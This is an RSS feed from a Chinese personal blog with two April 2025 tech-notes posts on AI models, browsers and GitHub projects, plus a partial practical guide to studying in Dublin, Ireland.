<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Nansen Li</title>
        <link>https://nansenli.com/zh-cn/</link>
        <description>Recent content on Nansen Li</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Nansen Li（李楠森）</copyright>
        <lastBuildDate>Sun, 20 Apr 2025 12:58:30 +0100</lastBuildDate><atom:link href="https://nansenli.com/zh-cn/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>2025 年 4 月科技随笔2</title>
        <link>https://nansenli.com/zh-cn/post/2025/04/tech250402/</link>
        <pubDate>Sun, 20 Apr 2025 12:58:30 +0100</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/04/tech250402/</guid>
        <description>&lt;h1 id=&#34;github-copoilt&#34;&gt;Github copoilt
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/7B5E29F0-04F0-4BC6-BF42-A090BF883232/1B8DE96B-D023-4EA3-A9B7-94AC20F994B6_2/uae66hikRIyaMetcYuqNpVPxScnxqLIVP7CbuCYQUr8z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;面对陌生的Github项目，再也不用害怕看不懂了。点击项目主页的Copolit图标，即可对话，还可使用GPT4.1交流，高达1M窗口上下文，从“这个项目能用来做什么”到“如何部署和处理bug”之类的问题，都能很好回答。&lt;/p&gt;
&lt;h1 id=&#34;dia-浏览器&#34;&gt;Dia 浏览器
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/7B5E29F0-04F0-4BC6-BF42-A090BF883232/163DCD8F-C75A-452C-BFB4-386246506C87_2/X65vEBw7vsKczPh47hfroa2U78FH82aW0W188i515bsz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.diabrowser.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.diabrowser.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前还未公测，可以通过上面的链接提交邮箱进入等待名单。&lt;/p&gt;
&lt;p&gt;Arc浏览器确实很好用，它拥有稳定、成熟且一致的体验，不单纯的只是侧边栏标签创新那么简单。&lt;/p&gt;
&lt;p&gt;Dia是Arc浏览器的下一代产品，其实不太理解为什么要重新发布一个新的产品，直接在Arc浏览器上做整合应该是最好的。现在创始人的想法反而是搁置Arc浏览器了。&lt;/p&gt;
&lt;p&gt;从产品体验上来看，Dia浏览器似乎分为下面几个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个内置的AI助手，可以进行日常对话&lt;/li&gt;
&lt;li&gt;一个类似nanobrowser或browser-use的浏览器操作助手，帮助规划和操作浏览器&lt;/li&gt;
&lt;li&gt;一个AI写作助手，可以在光标处生成文本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很有潜力的产品&lt;/p&gt;
&lt;h1 id=&#34;gpt-o3--o4-mini--o4-mini-high-41--41-mini--41-nano-发布&#34;&gt;GPT o3 / o4-mini / o4-mini-high/ 4.1 / 4.1 mini / 4.1 nano 发布
&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;模型&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;上下文窗口&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;输入定价&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;输出定价&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;图片定价&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;主要特性&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;o4‑mini‑high&lt;/td&gt;
&lt;td&gt;200K 令牌&lt;/td&gt;
&lt;td&gt;$1.10/M&lt;/td&gt;
&lt;td&gt;$4.40/M&lt;/td&gt;
&lt;td&gt;$0.842/K 图像输入&lt;/td&gt;
&lt;td&gt;o4‑mini 的高推理努力版本；高吞吐、低延迟；支持链式调用与结构化输出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;o4‑mini&lt;/td&gt;
&lt;td&gt;200K 令牌&lt;/td&gt;
&lt;td&gt;$1.10/M&lt;/td&gt;
&lt;td&gt;$4.40/M&lt;/td&gt;
&lt;td&gt;$0.842/K 图像输入&lt;/td&gt;
&lt;td&gt;紧凑型推理；AIME 99.5%、SWE‑bench 高分；优秀 STEM、视觉与代码编辑能力&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;o3&lt;/td&gt;
&lt;td&gt;200K 令牌&lt;/td&gt;
&lt;td&gt;$10/M&lt;/td&gt;
&lt;td&gt;$40/M&lt;/td&gt;
&lt;td&gt;$7.65/K 图像输入&lt;/td&gt;
&lt;td&gt;通用型强模型；顶级数学、科学、编码与视觉推理；需 BYOK&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GPT‑4.1&lt;/td&gt;
&lt;td&gt;1.05M 令牌&lt;/td&gt;
&lt;td&gt;$2/M&lt;/td&gt;
&lt;td&gt;$8/M&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;旗舰大模型；百万令牌上下文；卓越指令跟随、企业级检索与多模态理解&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GPT‑4.1 Mini&lt;/td&gt;
&lt;td&gt;1.05M 令牌&lt;/td&gt;
&lt;td&gt;$0.40/M&lt;/td&gt;
&lt;td&gt;$1.60/M&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;中型版本；接近 GPT‑4o 性能；低延迟、低成本；强编码与视觉理解&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GPT‑4.1 Nano&lt;/td&gt;
&lt;td&gt;1.05M 令牌&lt;/td&gt;
&lt;td&gt;$0.10/M&lt;/td&gt;
&lt;td&gt;$0.40/M&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;系列中最快最廉价；百万令牌上下文；适合分类与自动补全任务&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;GPT-4.1 Nano 天生适合翻译，成本非常低，例如配置在沉浸式翻译，开启中英双语字幕，平均每一集黑镜，仅需要0.5美分，翻译完7季只需要0.25美元，成本非常低。&lt;/p&gt;
&lt;p&gt;GPT-4.1 的上下文窗口终于来到1M了，之前GPT写代码简直被吊打，现在只能说追平了。&lt;/p&gt;
&lt;p&gt;o3、o4-mini、o4-mini-high表现非常惊喜，有一种小的deep research感觉。&lt;/p&gt;
&lt;p&gt;目前，我的日常基本上变成了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;o4-mini： 简单搜索和总结，可容忍失误&lt;/li&gt;
&lt;li&gt;o4-mini-high: 复杂搜索、总结、多步推理&lt;/li&gt;
&lt;li&gt;o3: 对准确率要求较高的复杂搜索、总结、多步推理&lt;/li&gt;
&lt;li&gt;4o: 直觉类和记忆知识类的回答&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而且我统计了每个模型的使用次数，差不多几乎都在使用，没有说哪个模型派不上用场的，不像是o3-mini幻觉太高基本就用不了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/7B5E29F0-04F0-4BC6-BF42-A090BF883232/DC4A64BB-D15D-4E5C-9935-959542088D94_2/FBIXjXobt8zUW4h50EAUCwThviDxe4qdm2EZoZyd5yAz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;元宝接入微信联系人&#34;&gt;元宝接入微信联系人
&lt;/h1&gt;&lt;p&gt;元宝微信，可以直接添加联系人发送信息。支持语音消息和图片消息。是豆包的竞品。优点是无需安装额外的应用。之前给父母推荐了豆包，他们都很喜欢使用。如果元宝也能支持语言通话，甚至视频聊天的话，可能会更有价值。&lt;/p&gt;
&lt;h1 id=&#34;openai免费令牌&#34;&gt;OpenAI免费令牌
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/7B5E29F0-04F0-4BC6-BF42-A090BF883232/D6609221-028B-4A9A-9A1E-67FBD11AFA3D_2/NWyA3JuI7Okojxa1qYNtsJz7ld2MhHRIvmzgTJzyhK0z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OpenAI 现在推出免费领牌活动，可以在Data controls中的sharing开启分享日志，即可领取。可惜就是时间太短了，只有一两周的时间，基本上用不完这么多额度。&lt;/p&gt;
&lt;h1 id=&#34;github-其他日榜周榜相关&#34;&gt;Github 其他日榜周榜相关
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/kestra-io/kestra&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/kestra-io/kestra&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;自动化运行平台，竞品包括：Airflow（数据管道）、Zapier（低代码营销自动化）、Rundeck（运维自动化）、Camunda （电商业务自动化）&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Zackriya-Solutions/meeting-minutes&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Zackriya-Solutions/meeting-minutes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一款语音转文本的软件，苹果 voice memos 的竞品。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/maybe-finance/maybe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/maybe-finance/maybe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;个人财报管理，类似有知有行&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/supabase-community/supabase-mcp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/supabase-community/supabase-mcp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在本地使用 AI 开发软件的时候，用于连接数据库的软件，基于 MCP 协议实现。若 MCP 真实未来标准协议之一，那数据库本身可能就会支持 MCP，可能会形成竞品。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/langgenius/dify&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/langgenius/dify&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;低代码 LLM 平台，LangChain的竞品，在现阶段的应用领域可部分代替LangChain。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2025 年 4 月科技随笔</title>
        <link>https://nansenli.com/zh-cn/post/2025/04/tech2504/</link>
        <pubDate>Tue, 15 Apr 2025 20:45:20 +0100</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/04/tech2504/</guid>
        <description>&lt;h1 id=&#34;前言&#34;&gt;前言
&lt;/h1&gt;&lt;p&gt;打算从这期记录一些每周的科技相关的随笔，还有一些感悟之类的。大概每两周到一个月更新一期吧。&lt;/p&gt;
&lt;h1 id=&#34;个人博客从-hugo-替换成-hexo&#34;&gt;个人博客从 Hugo 替换成 Hexo
&lt;/h1&gt;&lt;p&gt;这周开始，我把博客从 Hexo 迁移到 Hugo，主要是因为：&lt;/p&gt;
&lt;p&gt;Hugo 对 i18n 支持更好。因为 Hexo 对 i18n 并不太支持，之前自己魔改了模板，最后实现了中文和英文切换，但是维护成本很高，了解后发现 Hugo 原生支持多语言。&lt;/p&gt;
&lt;p&gt;不过在切换后，发现也有以下一些优点：&lt;/p&gt;
&lt;p&gt;主题配置更简单。我使用的是&lt;a class=&#34;link&#34; href=&#34;https://github.com/CaiJimmy/hugo-theme-stack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Stack&lt;/a&gt; 主题，基本上没有遇到坑。官方自带的 example 配置就很好，照这配置就好。另外，还带 Google Analysis 分析，还带 RSS 源，源也会自动区分语言，非常舒适。&lt;/p&gt;
&lt;p&gt;在切换的过程中，基本上没有遇到什么障碍，只要有你过去的 Markdown 文件，直接复制到新工程的目录下，再强制推送到原来的 github pages仓库，就可以直接迁移过来。强制推送后，需要在 github重新配置一下自定义域名，就无损升级了，包括评论之类的都是一样的。&lt;/p&gt;
&lt;p&gt;唯一不同的是，Hugo 默认使用小写链接，而 Hexo 默认保留大小写，这可能使得过去的一些链接失效，搜索引擎需要重新建立索引。&lt;/p&gt;
&lt;h1 id=&#34;神秘模型optimus-alpha出现在httpsopenrouteraihttpsopenrouterai-并霸榜&#34;&gt;神秘模型Optimus Alpha出现在&lt;a class=&#34;link&#34; href=&#34;https://openrouter.ai/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://openrouter.ai/&lt;/a&gt; 并霸榜
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/CF079AA6-5627-41A7-BD3B-61DC8C7A1D30/09F3DABA-B0EC-4238-AA1B-D6B583B5036D_2/7vZxVyp6Mzx1i3RJclnxPOylG5qpW4AoD5dOyx9aN28z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;由于该模型免费，并且性能很强，在上线后，就被选择成为 OpenRouter 的首席流量处理模型。&lt;/p&gt;
&lt;p&gt;随着14 号 OpenAI 官方公布 GPT4.1 后，该模型从 OpenRouter 下架。显然，该模型就是 GPT4.1。&lt;/p&gt;
&lt;p&gt;GPT4.1 是一个编程能力特化的模型，拥有 1M 的上下文窗口。确实，现在编程领域，OpenAI 被 Claude 3.7 还有 Gemini2.5pro 打的鼻青脸肿，无论是 o1 还是 o3 模型，都没能在编程领域取得什么领先地位。希望 OpenAI 再接再厉吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenRouter 是一个让用户&lt;strong&gt;统一接入多个大语言模型 API&lt;/strong&gt; 的中间层服务平台。你可以把它理解成一个「代理」或「路由器」，统一管理不同大模型厂商（OpenAI、Anthropic、Mistral、Google Gemini、Cohere 等）的调用方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看起来，这次，OpenAI 选择了 OpenRouter 作为测试发布平台，而不是&lt;a class=&#34;link&#34; href=&#34;https://lmarena.ai/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://lmarena.ai/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;openrouterai&#34;&gt;OpenRouter.ai
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://openrouter.ai/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OpenRouter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是一个 LLM平台，包含大量的免费/收费高质量模型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/CF079AA6-5627-41A7-BD3B-61DC8C7A1D30/277ACFEF-FB85-467F-9D1E-BEDB3D58C9C5_2/PZ8psGjIZxKeOn75AEoA00UOtcS5uLiFuBAfsxW4PTAz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;选择 Prompt pricing 为 0 元，再选择 Top Weekly，就可以看到目前最好的免费模型。&lt;/p&gt;
&lt;p&gt;不过使用时需要开启 log 和使用数据进行训练。&lt;/p&gt;
&lt;p&gt;目前可以选择 Gemini 2.5 pro。&lt;/p&gt;
&lt;p&gt;其中Ranking功能可以实时查看平台上所有的流量分发情况，哪个模型好用一目了然。&lt;/p&gt;
&lt;h1 id=&#34;nanobrowser&#34;&gt;nanobrowser
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/CF079AA6-5627-41A7-BD3B-61DC8C7A1D30/21689C29-B179-4FF5-B273-AB55B0F88035_2/wOZXJzNxKTAsj9yXaGQ0Lkoj2uMt9IolO95xl6OpAw8z/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一款用于 Chrome 的浏览器插件，可以控制浏览器的自动化操作。&lt;/p&gt;
&lt;p&gt;试验了一下，无法支持 Arc 浏览器。体验下来能力有限，例如，对网页的滚动偶尔失效，无法总结整个页面的内容，只能看到局部的内容，操作偶尔不正确。&lt;/p&gt;
&lt;p&gt;虽然该产品不太推荐，不过这可能是未来一个方向，看起来，以后会出现大量的 AI 代理。&lt;/p&gt;
&lt;p&gt;抢票、刷分之类的灰色产业估计会很开心。&lt;/p&gt;
&lt;h1 id=&#34;markitdown&#34;&gt;markitdown
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/CF079AA6-5627-41A7-BD3B-61DC8C7A1D30/AD0E26DD-694F-49AA-BCB1-15F0C436F7DA_2/tmL6Lf4yxBaPfxdxJHyMExDnwk7wx8xyiQCJmDxE3GMz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一款用于将不同格式的内容转换成 Markdown 格式的工具。&lt;/p&gt;
&lt;p&gt;离线情况下，可以处理不同的文件转换成 Markdown 格式，试用了一下，转换得比较基础。&lt;/p&gt;
&lt;p&gt;也可以支持接入 LLM，提升转换结果和文档中图片的部分。&lt;/p&gt;
&lt;p&gt;在未来可能是一款不错的 MCP 服务。&lt;/p&gt;
&lt;h1 id=&#34;pdf-search&#34;&gt;PDF search
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://res.craft.do/user/full/c5e6e898-910c-6f27-fbc5-91f4c34a9511/doc/CF079AA6-5627-41A7-BD3B-61DC8C7A1D30/C949BE2A-AF19-4449-9FB5-47DC19149CFB_2/wIMDrjDyXU3qxyyMox6ieXWPd5TQgUhViKqWzAlYV6oz/Image.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Image.png&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一款应用，可以快速搜索多个 pdf 中出现的内容。&lt;/p&gt;
&lt;p&gt;使用类似模糊搜索的方式，原理是对 PDF 做了分割并且进行了嵌入向量计算，随后和搜索词进行匹配。&lt;/p&gt;
&lt;p&gt;适合考试期间搜索文档使用。&lt;/p&gt;
&lt;p&gt;缺点是，index 是按照页面划分的，搜索后需要自己在页面中找到对应的 part。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>爱尔兰留学不完全攻略</title>
        <link>https://nansenli.com/zh-cn/post/2025/04/ireland-study-guide/</link>
        <pubDate>Thu, 10 Apr 2025 18:12:47 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2025/04/ireland-study-guide/</guid>
        <description>&lt;p&gt;其实这篇算不上攻略吧，只是对晨鹤的一些内容做一些个人的补充分享。&lt;/p&gt;
&lt;p&gt;晨鹤链接：&lt;a class=&#34;link&#34; href=&#34;https://chenhe.me/post/ireland&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://chenhe.me/post/ireland&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;晨鹤写的内容挺好，很详实，基本上解答了我很多当时来爱尔兰的困惑&lt;/p&gt;
&lt;p&gt;文章未完成，本文不定期更新。&lt;/p&gt;
&lt;h1 id=&#34;背景&#34;&gt;背景
&lt;/h1&gt;&lt;p&gt;地点在都柏林，录取的学校是 DCU。&lt;/p&gt;
&lt;h2 id=&#34;出发前&#34;&gt;出发前
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;直接点名型号吧，苏泊尔小绿锅压力锅。为什么必须要这个而不是其他的呢，因为：1. 压力蒸出来的米饭更好吃。 2. 炖煮类的，例如炖牛腩，卤鸡腿之类的，更方便。 我自己也带了小米的电饭煲，但是来了这边发现电饭煲煮的饭一点也不好吃，只有高压锅煮出来的饭好吃😋。另外，好像只有这款 10 分钟压力就能煮完米饭了，看了下其他款，并没有这么快的速度，我猜想可能和他的小容量有关。&lt;/li&gt;
&lt;li&gt;药品：强烈推荐带一盒感康，感冒的时候吃一粒马上就好多了。创可贴可以带一些透明的防水的那种。&lt;/li&gt;
&lt;li&gt;水杯：来了之后，发现想买到喜欢的水杯好难。如果人在国内，淘宝上买一个合适的水杯很重要。&lt;/li&gt;
&lt;li&gt;小红书：以前以为是个美妆 APP，在国内几乎没有用过。出国才发现这是个出国 APP，以下内容小红书上有大量攻略，可以酌情浏览，当然有的人不太喜并对其嗤之以鼻，萝卜白菜各有所爱吧（晨鹤不要打我）。&lt;/li&gt;
&lt;li&gt;驾照：我带了，但是来了就过期了，所以没怎么用到。如果有效期内的话，考驾照会减免考试所需要的时间。&lt;/li&gt;
&lt;li&gt;现金：其实不用换太多欧元。在国内办好一张双币信用卡，例如 visa 或者 master card，来了这边是可以直接刷卡的。这边现金消费的场景比较少。&lt;/li&gt;
&lt;li&gt;衣服：建议带多层的穿搭。由于这边天气多变，室内外温差大，可能会频繁增减衣物。冬天还是蛮冷的，羽绒服类似的厚度的可以带两件换着穿。&lt;/li&gt;
&lt;li&gt;行李箱：海南航空可以申请留学生认证，可以携带最多两个 28 寸的行李箱。不过对我来说太多了，我最后带了一个 20 的一个 28 的。另外 28 寸行李箱其实塞满也很容易超重。想带 26 寸的也可以。&lt;/li&gt;
&lt;li&gt;体验，牙科，手术等等：这边费用比较贵，在国内尽量都做了。例如补牙或者激光手术等等。&lt;/li&gt;
&lt;li&gt;转换插头：一个高质量的转换插头会很方便。可以考虑准备一些简单的转换插头，再买一个带多口充电口的转换插头。另外可以考虑购买一个特殊排插，头是英标的，插座是国标的。&lt;/li&gt;
&lt;li&gt;生活费：租房可能要 600-1200 欧，如果自己做饭，伙食每个月 500 欧，生活费可能是 1000-1800欧一个月，取决于个人消费水平。&lt;/li&gt;
&lt;li&gt;机票：海航直飞都柏林的机票不错，特别是，如果你从上海转机而不是在北京飞，机票会更便宜。也就是说多做一段飞机反而更便宜。&lt;/li&gt;
&lt;li&gt;临时住宿：可以在Airbnb 或者 Booking 上预定临时住宿。&lt;/li&gt;
&lt;li&gt;中餐调料：来了之后，你会发现每天的生活很大一部分就是买菜做饭。不过，基本上所有调料在本地中国超市有售卖，因此不必带太多调料品。具体售卖的清单可以搜索融兴行小程序353购查看。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;入境&#34;&gt;入境
&lt;/h1&gt;&lt;p&gt;展示下面的内容即可：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;护照&lt;/li&gt;
&lt;li&gt;保险&lt;/li&gt;
&lt;li&gt;录取通知书&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;到达爱尔兰后&#34;&gt;到达爱尔兰后
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;抵达住宿地点：在机场拦出租车即可。&lt;/li&gt;
&lt;li&gt;买电话卡：这个可以办理学生套餐的，20 欧，无限流量。我办理的是&lt;strong&gt;Vodafone 的&lt;/strong&gt;。记得配置自动 20 天充值，不然每次都要手动充值很麻烦。&lt;/li&gt;
&lt;li&gt;办理公交卡：可以先办理一张成人卡，之后，再到市中心换学生卡。学生卡半价。然后可以在官网将成人卡注销，可以退卡退费的。&lt;/li&gt;
&lt;li&gt;办理居留卡 IRP：提前预约，若等到 9 月开学再预约，就要排队到 11 月了。有了 IRP，就可以离开爱尔兰了，例如回国，或者去英国或者欧洲玩了。&lt;/li&gt;
&lt;li&gt;办理银行卡：可以通过 AIB 办理，无需到现场办理，手机即可办理。办理需要学生证，学生银行卡可以免年费。银行卡尽早办理，同时提供的地址证明也是办理其他手续的重要资料。&lt;/li&gt;
&lt;li&gt;办理&lt;strong&gt;PPSN&lt;/strong&gt;：虽然不是一定要用到，但是万一呢。尽量提前办理好。如果找到实习了就可以报税用了。驾照报考也会用到。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;支付&#34;&gt;支付
&lt;/h1&gt;&lt;p&gt;平时日常基本上大部分场景都是刷卡支付，使用银行卡靠一下无线的标志就可以支付了。也可以在手机上配置 Apple pay 进行支付。&lt;/p&gt;
&lt;h1 id=&#34;租房&#34;&gt;租房
&lt;/h1&gt;&lt;p&gt;DCU学校旁边有两家公寓，非常推荐， 在 shanowen 路上，一家是 Shanowen Square，另外一家是 Shanowen Hall，最好提前几个月来预约，不然到时候没有空房。市区的话 Beckett House 也不错，适合 TCD 的学生。当然如果摇号摇到学校的公寓是最好的。总之，优先学校宿舍，学生公寓，其次可以找房东租房。寄宿家庭的话，和房东一起住的话，可能因人而异，对我来说，我已经体验过了，不算噩梦，也不算美梦，但有个经历之后就好，让我再来一次我打死不要。也有同学说，寄宿家庭环境不错的。&lt;/p&gt;
&lt;h1 id=&#34;居家和床上用品&#34;&gt;居家和床上用品
&lt;/h1&gt;&lt;p&gt;可以在IKEA 上下单，到时候会送到房间。但是注意时效不一定准，可能会第二天才送。学生优惠记得使用，我记得当时我结完账才发现有优惠，联系工作人员，可以帮你取消再重新结算。Homebase 的东西也不错，里面的电暖气很赞，几十欧很大只又很轻，冬天太冷晚上停暖气的话，可以使用这个。&lt;/p&gt;
&lt;h1 id=&#34;药店&#34;&gt;药店
&lt;/h1&gt;&lt;p&gt;在国内很少逛药店，但这里的药店除了药以外，还卖很多其他东西，例如化妆品保健品护肤品洗浴用品。基本上 Boots 就可以搞定。市区的 Boots 有家比较大，二楼还可以拍证件照，非常万能。&lt;/p&gt;
&lt;h1 id=&#34;餐饮&#34;&gt;餐饮
&lt;/h1&gt;&lt;p&gt;基本上都是自己做饭。可以去市区融兴行中超购买。融兴行小程序可以全城配送，配送费满 30 欧备注“融逸生活”免配送费，当天早上订单下午即可送达，非常方便！！！&lt;/p&gt;
&lt;p&gt;其他超市说实话本人用的不太多。DCU 附近有 LIDL 还有 Tesco，里面也有一些生鲜，我主要用来补充一些肉类。&lt;/p&gt;
&lt;p&gt;肉类的话，这边的猪肉实在是味道太大了。基本没吃过。只吃牛肉。&lt;/p&gt;
&lt;p&gt;lidl 的Rib eye steak 味道还不错，肥瘦相间，8 欧多 400g，可以吃两顿。另外就是 lidl 的鸡腿肉了，带皮带骨的价格很划算。&lt;/p&gt;
&lt;p&gt;融兴行有卖牛腩，炖牛肉很好吃。&lt;/p&gt;
&lt;p&gt;这边炉灶不太好用，用的电陶炉居多。可能需要习惯一段时间火力。&lt;/p&gt;
&lt;h1 id=&#34;公交&#34;&gt;公交
&lt;/h1&gt;&lt;p&gt;爱尔兰公交系统发达，基本上不需要打车。TFI Live 可以实时查看任意站点的下一辆车的到达时间，比 Google 准，在没有电子指示的站点很有用，推荐下载使用。出行主要是公交车，偶尔会有Luas、Dart 等等。&lt;/p&gt;
&lt;h1 id=&#34;网购&#34;&gt;网购
&lt;/h1&gt;&lt;p&gt;推荐使用 Shein，满足一定金额即可包邮。一般快递需要 10 天左右送达。可以购买生活用品等。无食品。&lt;/p&gt;
&lt;p&gt;另外学生可以免费开亚马逊的学生会员半年。极大的减少快递费用。&lt;/p&gt;
&lt;p&gt;不走 Shein如果想要像淘宝一样，买东西，然后 走国际货运公司空运 10 天收到的话，运费极高，2kg 的话运费在 200-300 人民币。走海运，运费便宜一点，2kg 的话，在 60-80 人民币。所以如果买一些日用品的话，Shein 上能买到的话，尽量在 Shein 上买，还包邮费。&lt;/p&gt;
&lt;p&gt;Ochama 商品会更全，并且包含各种中国食品，以及部分京造产品（京东旗下在欧洲的公司），结账使用邀请码（7WYM5K）可以获得 10 欧优惠卷。但是运费有点贵，如果没有优惠的情况下，基本上很少用到。&lt;/p&gt;
&lt;h1 id=&#34;服饰&#34;&gt;服饰
&lt;/h1&gt;&lt;p&gt;南边有一个 Dundrum Town Centre，里面服装比较多。市区 Henry St 的服装也挺多的。&lt;/p&gt;
&lt;h1 id=&#34;国内游玩&#34;&gt;国内游玩
&lt;/h1&gt;&lt;p&gt;如果是报了语言班的话（我报了 DCU 的 5 周语言班，还蛮不错的，不然开学冲击太大，相当于提前了解了一下学校），7 月-8 月都比较适合出行游玩。可以去高威科克转一转。但如果没有报语言班，只是 9 月之后的话，来了天气就不太好了，会冷，日照时间也减少了很多，所以 9 月开学的时候可以去玩玩，10 月之后就不太适合玩了。之后适合游玩的话，可能要到第二年 4 月之后了，到那个时候，日照恢复，温度也上升了。&lt;/p&gt;
&lt;h1 id=&#34;签证&#34;&gt;签证
&lt;/h1&gt;&lt;ul&gt;
